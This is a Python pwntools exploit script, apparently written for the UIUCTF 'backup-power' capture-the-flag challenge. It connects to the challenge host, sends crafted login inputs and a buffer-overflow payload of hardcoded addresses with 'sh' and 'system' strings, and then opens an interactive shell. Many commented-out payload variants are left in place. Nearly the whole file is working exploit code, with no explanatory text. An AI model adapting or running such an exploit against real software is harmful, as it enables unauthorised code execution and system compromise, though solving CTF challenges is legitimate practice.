from pwn import *
from icecream import ic

elf = exe = ELF("./backup-power")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return process(['ncat', '--ssl', 'backup-power.chal.uiuc.tf', '1337'])
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *develper_power_management_portal
b *develper_power_management_portal+84
b *0x00400acc
b *0x00400d80
b *0x00400d9c
b *0x00400b10
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

sla('Username:', p32(0x4080038c))
sla(b"Password: ", b"hi")
sla("Command: ", "shutdown")

sla('Username:', 'devolper')
payload = b'\x00'*24
payload += b'sh\x00\x00'
payload += b'\x00'*16
payload += p32(0x400b0c)
payload += p32(0x400b0c)
payload += p32(0x8003b8)
payload += b'\x00'*4
payload += p32(0x7efefeff)

payload += b'\x00\x00sh'
payload += b'\x00'*4
payload += p32(0x4aa330)
payload += b'\x00'*4
# payload += p32(0x40800580)
# payload += p32(0x408005a0)
# payload += p32(0x408005c0)
# payload += p32(0x408005e0)

payload += p32(0x4721c8)
payload += b'\x00'*8
payload += p32(0x00400d9c)
payload += b'devolper'
payload += b'\x00'*92
payload += b'\x00'*100

payload += b'system'
# payload += b'\x00'*0x56
# payload += p32(0x4aa330)
# payload += b'\x00'*4

# payload += b'/bin/sh\x00\x00\x00'

# payload += b'\x00'*118

# payload += b'shutdown\x00\x00\x00|'
# payload += b'shutup\x00w'
# payload += b'system\x00\x00'

# payload += b'\x00\x00\x00/'
# payload += b'\x00'*28
# payload += b'\x00\x00\x00b'
# payload += b'\x00'*28
# payload += b'\x00\x00\x00i'
# payload += b'\x00'*28
# payload += b'\x00\x00\x00n'
# payload += b'\x00'*28
# payload += b'\x00'*0x80
# payload += p32(0x800)
# payload += p32(0x800)
# payload += p32(0xd9c)

# payload += p32(0x40800564)
# payload += p32(0x40800578)

# payload += b'\x00'*8
# payload += p32(0x401010)

# payload += p32(0x40800580)
# payload += p32(0x408005a0)
# payload += p32(0x408005c0)
# payload += p32(0x408005e0)

# payload = b'a'
sl(payload)

# sla('Username:', 'bleh')
# sla(b"Password: ", b"hi")
# sla("Command: ", "system")

# sla('Username:', 'devolper')
# payload = b'\x00'*44
# payload += p32(0)
# payload += p32(0x400b0c)
# payload += p32(0x400b0c)
# payload += b'b'*20

# sl(payload)

io.interactive()
